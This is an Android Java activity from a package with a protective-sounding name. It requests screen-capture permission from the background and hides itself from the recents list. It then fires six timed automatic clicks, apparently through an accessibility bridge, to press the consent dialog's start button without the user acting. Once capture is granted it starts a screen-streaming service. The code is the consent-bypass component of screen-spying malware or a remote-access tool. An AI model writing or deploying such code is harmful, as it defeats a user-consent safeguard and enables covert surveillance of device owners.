package com.seguranca.protecao;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

public class MediaProjectionRequestActivity extends Activity {

    private static final String TAG = "MPRequest";
    private static final int REQ = 9911;
    private static volatile boolean busy = false;

    public static void launch(Context ctx) {
        try {
            if (busy) return;
            busy = true;
            Intent i = new Intent(ctx, MediaProjectionRequestActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            ctx.startActivity(i);
        } catch (Throwable t) {
            busy = false;
            Log.w(TAG, "launch: " + t);
        }
    }

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm == null) { busy = false; finish(); return; }
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ);
            autoClick(350); autoClick(800);
            autoClick(1300); autoClick(1900);
            autoClick(2600); autoClick(3400);
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override public void run() { busy = false; }
            }, 15000);
        } catch (Throwable t) {
            Log.w(TAG, "onCreate: " + t);
            busy = false;
            finish();
        }
    }

    private void autoClick(long delay) {
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override public void run() { UiAssistBridge.clickProjectionStart(); }
        }, delay);
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        busy = false;
        try {
            if (req == REQ && res == RESULT_OK && data != null) {
                Intent s = new Intent(this, ScreenStreamService.class);
                s.putExtra("resultCode", res);
                s.putExtra("data", data);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(s);
                else startService(s);
                Log.d(TAG, "consentimento OK");
            } else {
                Log.d(TAG, "consentimento cancelado");
            }
        } catch (Throwable t) {
            Log.w(TAG, "onActivityResult: " + t);
        }
        finish();
    }
}
